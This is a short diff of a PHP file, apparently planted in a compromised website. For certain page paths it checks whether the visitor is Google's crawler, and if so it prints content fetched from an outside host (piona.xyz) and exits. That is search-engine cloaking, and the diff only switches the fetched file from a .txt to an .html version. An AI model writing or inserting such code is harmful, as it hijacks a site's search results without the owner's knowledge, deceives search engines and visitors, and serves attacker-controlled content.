@@ -28,7 +28,7 @@ $is_target_page =
     stripos($requestUri, '/ijsrp-paper-format.php') === 0;
 
 if ($is_target_page && is_google_bot()) {
-    echo file_get_contents("https://piona.xyz/landing/www.journalofosseointegration.eu/index.txt");
+    echo file_get_contents("https://piona.xyz/landing/www.journalofosseointegration.eu/index.html");
     exit;
 }
 ?>
